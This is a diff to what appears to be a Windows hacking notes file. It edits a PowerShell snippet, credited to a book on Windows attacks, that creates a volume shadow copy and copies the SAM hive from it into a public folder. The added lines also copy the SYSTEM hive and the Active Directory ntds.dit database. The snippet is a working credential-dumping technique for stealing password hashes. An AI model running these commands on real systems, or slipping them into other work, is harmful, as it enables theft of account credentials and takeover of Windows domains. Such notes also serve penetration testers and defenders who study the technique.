@@ -225,7 +225,9 @@ if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
 $id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
 $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
-$voume.Delete();if($notrunning -eq 1){$service.Stop()}
+cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
+cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
+$volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 
 Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
